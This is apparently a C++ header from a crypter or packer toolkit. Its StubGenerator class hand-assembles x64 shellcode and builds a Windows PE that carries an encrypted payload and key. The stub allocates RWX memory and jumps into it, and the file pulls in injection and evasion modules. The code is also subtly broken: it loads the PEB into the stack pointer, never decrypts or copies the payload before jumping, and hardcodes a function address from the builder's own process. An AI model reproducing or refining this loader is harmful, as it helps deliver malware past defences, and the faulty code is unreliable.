#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <memory>
#include <algorithm>
#include "injection_methods.hpp"
#include "encryption.hpp"
#include "evasion.hpp"

class StubGenerator {
private:
    class StubBytes {
    public:
        static void addPrologue(std::vector<uint8_t>& stub) {
            // Function prologue
            // mov [rsp+8], rbx
            stub.push_back(0x48); stub.push_back(0x89); stub.push_back(0x5C); 
            stub.push_back(0x24); stub.push_back(0x08);
            // mov [rsp+10h], rbp
            stub.push_back(0x48); stub.push_back(0x89); stub.push_back(0x6C);
            stub.push_back(0x24); stub.push_back(0x10);
            // mov [rsp+18h], rsi
            stub.push_back(0x48); stub.push_back(0x89); stub.push_back(0x74);
            stub.push_back(0x24); stub.push_back(0x18);
            // push rdi
            stub.push_back(0x57);
            // sub rsp, 70h
            stub.push_back(0x48); stub.push_back(0x83); stub.push_back(0xEC);
            stub.push_back(0x70);
        }

        static void addGetModuleBase(std::vector<uint8_t>& stub) {
            // xor rax, rax
            stub.push_back(0x48); stub.push_back(0x31); stub.push_back(0xC0);
            // mov rsp, gs:[rax+60h]
            stub.push_back(0x65); stub.push_back(0x48); stub.push_back(0x8B);
            stub.push_back(0x60); stub.push_back(0x60);
            // mov rax, [rax+18h]
            stub.push_back(0x48); stub.push_back(0x8B); stub.push_back(0x40);
            stub.push_back(0x18);
            // mov rsi, [rax+20h]
            stub.push_back(0x48); stub.push_back(0x8B); stub.push_back(0x70);
            stub.push_back(0x20);
        }

        static void addSetupAlloc(std::vector<uint8_t>& stub) {
            // mov rcx, payload_size
            stub.push_back(0x48); stub.push_back(0xB9);
        }

        static void addAllocFlags(std::vector<uint8_t>& stub) {
            // mov rdx, rcx
            stub.push_back(0x48); stub.push_back(0x89); stub.push_back(0xCA);
            // mov r8, 0
            stub.push_back(0x49); stub.push_back(0xC7); stub.push_back(0xC0);
            stub.push_back(0x00); stub.push_back(0x00); stub.push_back(0x00);
            stub.push_back(0x00);
            // mov r9, PAGE_EXECUTE_READWRITE
            stub.push_back(0x49); stub.push_back(0xC7); stub.push_back(0xC1);
            stub.push_back(0x40); stub.push_back(0x00); stub.push_back(0x00);
            stub.push_back(0x00);
            // mov rax, VirtualAlloc
            stub.push_back(0x48); stub.push_back(0xB8);
        }

        static void addPostCall(std::vector<uint8_t>& stub) {
            // call rax
            stub.push_back(0xFF); stub.push_back(0xD0);
            // mov [rsp+20h], rax
            stub.push_back(0x48); stub.push_back(0x89); stub.push_back(0x44);
            stub.push_back(0x24); stub.push_back(0x20);
            // mov rax, [rsp+20h]
            stub.push_back(0x48); stub.push_back(0x8B); stub.push_back(0x44);
            stub.push_back(0x24); stub.push_back(0x20);
            // add rsp, 70h
            stub.push_back(0x48); stub.push_back(0x83); stub.push_back(0xC4);
            stub.push_back(0x70);
            // pop rdi
            stub.push_back(0x5F);
            // mov rsi, [rsp+18h]
            stub.push_back(0x48); stub.push_back(0x8B); stub.push_back(0x74);
            stub.push_back(0x24); stub.push_back(0x18);
            // mov rbp, [rsp+10h]
            stub.push_back(0x48); stub.push_back(0x8B); stub.push_back(0x6C);
            stub.push_back(0x24); stub.push_back(0x10);
            // mov rbx, [rsp+8]
            stub.push_back(0x48); stub.push_back(0x8B); stub.push_back(0x5C);
            stub.push_back(0x24); stub.push_back(0x08);
            // jmp rax
            stub.push_back(0xFF); stub.push_back(0xE0);
        }
    };

public:
    StubGenerator() = default;

    bool initialize(PEManipulator::InjectionType injType) {
        m_injectionType = injType;
        m_initialized = true;
        return true;
    }

    void setTargetProcess(const std::wstring& process) {
        m_targetProcess = process;
    }

    void setPayload(const std::vector<uint8_t>& payload) {
        m_payload = payload;
    }

    void setKey(const std::vector<uint8_t>& key) {
        m_key = key;
    }

    void setEntryPoint(DWORD entryPoint) {
        m_entryPoint = entryPoint;
    }

    bool generate(std::vector<uint8_t>& output) {
        try {
            if (!m_initialized || m_payload.empty() || m_key.empty()) {
                printf("[-] StubGenerator not properly initialized\n");
                return false;
            }

            std::vector<Section> sections;

            auto stubCode = generateStubCode();
            if (stubCode.empty()) {
                printf("[-] Failed to generate stub code\n");
                return false;
            }

            sections.push_back(createSection(".text", stubCode, 
                IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ));

            std::vector<uint8_t> data;
            data.insert(data.end(), m_payload.begin(), m_payload.end());
            data.insert(data.end(), m_key.begin(), m_key.end());
            sections.push_back(createSection(".data", data, 
                IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE));

            auto strings = generateStringData();
            sections.push_back(createSection(".rdata", strings,
                IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ));

            output = createPE(sections);
            return !output.empty();
        }
        catch (const std::exception& e) {
            printf("[-] Exception in stub generation: %s\n", e.what());
            return false;
        }
    }

private:
    struct Section {
        std::string name;
        std::vector<uint8_t> data;
        DWORD characteristics;
    };

    Section createSection(const std::string& name, const std::vector<uint8_t>& data, DWORD characteristics) {
        return {name, data, characteristics};
    }

    std::vector<uint8_t> generateStubCode() {
        try {
            std::vector<uint8_t> stub;

            // Add prologue
            StubBytes::addPrologue(stub);

            // Add get module base
            StubBytes::addGetModuleBase(stub);

            // Add setup VirtualAlloc call
            StubBytes::addSetupAlloc(stub);

            // Add payload size
            uint64_t payloadSize = m_payload.size();
            uint8_t* sizeBytes = reinterpret_cast<uint8_t*>(&payloadSize);
            stub.insert(stub.end(), sizeBytes, sizeBytes + sizeof(payloadSize));

            // Add memory allocation flags
            StubBytes::addAllocFlags(stub);

            // Add VirtualAlloc address
            HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
            void* virtualAlloc = GetProcAddress(kernel32, "VirtualAlloc");
            uint8_t* fnBytes = reinterpret_cast<uint8_t*>(&virtualAlloc);
            stub.insert(stub.end(), fnBytes, fnBytes + sizeof(void*));

            // Add post call and epilogue
            StubBytes::addPostCall(stub);

            return stub;
        }
        catch (const std::exception& e) {
            printf("[-] Exception in generateStubCode: %s\n", e.what());
            return std::vector<uint8_t>();
        }
    }

    std::vector<uint8_t> generateStringData() {
        std::vector<uint8_t> strings;
        
        const wchar_t* dllNames[] = {
            L"kernel32.dll",
            L"ntdll.dll",
            L"bcrypt.dll"
        };

        const char* funcNames[] = {
            "VirtualAlloc",
            "VirtualProtect",
            "LoadLibraryW",
            "GetProcAddress"
        };

        for (const auto& dll : dllNames) {
            size_t len = (wcslen(dll) + 1) * sizeof(wchar_t);
            strings.insert(strings.end(), 
                reinterpret_cast<const uint8_t*>(dll),
                reinterpret_cast<const uint8_t*>(dll) + len);
        }

        while (strings.size() % 4 != 0) strings.push_back(0);

        for (const auto& func : funcNames) {
            size_t len = strlen(func) + 1;
            strings.insert(strings.end(), 
                reinterpret_cast<const uint8_t*>(func),
                reinterpret_cast<const uint8_t*>(func) + len);
        }

        while (strings.size() % 16 != 0) strings.push_back(0);

        return strings;
    }

    std::vector<uint8_t> createPE(const std::vector<Section>& sections) {
        std::vector<uint8_t> pe;

        IMAGE_DOS_HEADER dosHeader = {0};
        dosHeader.e_magic = IMAGE_DOS_SIGNATURE;
        dosHeader.e_lfanew = sizeof(IMAGE_DOS_HEADER);
        pe.insert(pe.end(), 
            reinterpret_cast<uint8_t*>(&dosHeader),
            reinterpret_cast<uint8_t*>(&dosHeader) + sizeof(dosHeader));

        IMAGE_NT_HEADERS64 ntHeaders = {0};
        ntHeaders.Signature = IMAGE_NT_SIGNATURE;
        ntHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64;
        ntHeaders.FileHeader.NumberOfSections = sections.size();
        ntHeaders.FileHeader.SizeOfOptionalHeader = sizeof(IMAGE_OPTIONAL_HEADER64);
        ntHeaders.FileHeader.Characteristics = IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_LARGE_ADDRESS_AWARE;

        ntHeaders.OptionalHeader.Magic = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
        ntHeaders.OptionalHeader.AddressOfEntryPoint = 0x1000;
        ntHeaders.OptionalHeader.ImageBase = 0x140000000;
        ntHeaders.OptionalHeader.SectionAlignment = 0x1000;
        ntHeaders.OptionalHeader.FileAlignment = 0x200;
        ntHeaders.OptionalHeader.MajorSubsystemVersion = 6;
        ntHeaders.OptionalHeader.MinorSubsystemVersion = 0;
        ntHeaders.OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;

        DWORD currentFileOffset = align(
            sizeof(IMAGE_DOS_HEADER) + 
            sizeof(IMAGE_NT_HEADERS64) + 
            sections.size() * sizeof(IMAGE_SECTION_HEADER),
            ntHeaders.OptionalHeader.FileAlignment);

        DWORD currentVirtualOffset = ntHeaders.OptionalHeader.SectionAlignment;

        std::vector<IMAGE_SECTION_HEADER> sectionHeaders;
        for (const auto& section : sections) {
            IMAGE_SECTION_HEADER header = {0};
            memcpy(header.Name, section.name.c_str(), std::min(section.name.length(), (size_t)8));
            
            header.VirtualAddress = currentVirtualOffset;
            header.PointerToRawData = currentFileOffset;
            header.SizeOfRawData = align(section.data.size(), ntHeaders.OptionalHeader.FileAlignment);
            header.Misc.VirtualSize = section.data.size();
            header.Characteristics = section.characteristics;

            sectionHeaders.push_back(header);

            currentFileOffset += header.SizeOfRawData;
            currentVirtualOffset += align(header.Misc.VirtualSize, ntHeaders.OptionalHeader.SectionAlignment);
        }

        ntHeaders.OptionalHeader.SizeOfImage = currentVirtualOffset;
        ntHeaders.OptionalHeader.SizeOfHeaders = align(
            sizeof(IMAGE_DOS_HEADER) + 
            sizeof(IMAGE_NT_HEADERS64) + 
            sections.size() * sizeof(IMAGE_SECTION_HEADER),
            ntHeaders.OptionalHeader.FileAlignment);

        pe.insert(pe.end(),
            reinterpret_cast<uint8_t*>(&ntHeaders),
            reinterpret_cast<uint8_t*>(&ntHeaders) + sizeof(ntHeaders));

        for (const auto& header : sectionHeaders) {
            pe.insert(pe.end(),
                reinterpret_cast<const uint8_t*>(&header),
                reinterpret_cast<const uint8_t*>(&header) + sizeof(header));
        }

        pe.resize(ntHeaders.OptionalHeader.SizeOfHeaders, 0);

        for (size_t i = 0; i < sections.size(); i++) {
            const auto& section = sections[i];
            const auto& header = sectionHeaders[i];

            pe.resize(header.PointerToRawData + header.SizeOfRawData, 0);
            memcpy(&pe[header.PointerToRawData], section.data.data(), section.data.size());
        }

        return pe;
    }

    static DWORD align(DWORD value, DWORD alignment) {
        return (value + alignment - 1) & ~(alignment - 1);
    }

    PEManipulator::InjectionType m_injectionType;
    std::wstring m_targetProcess;
    std::vector<uint8_t> m_payload;
    std::vector<uint8_t> m_key;
    DWORD m_entryPoint = 0;
    bool m_initialized = false;
};
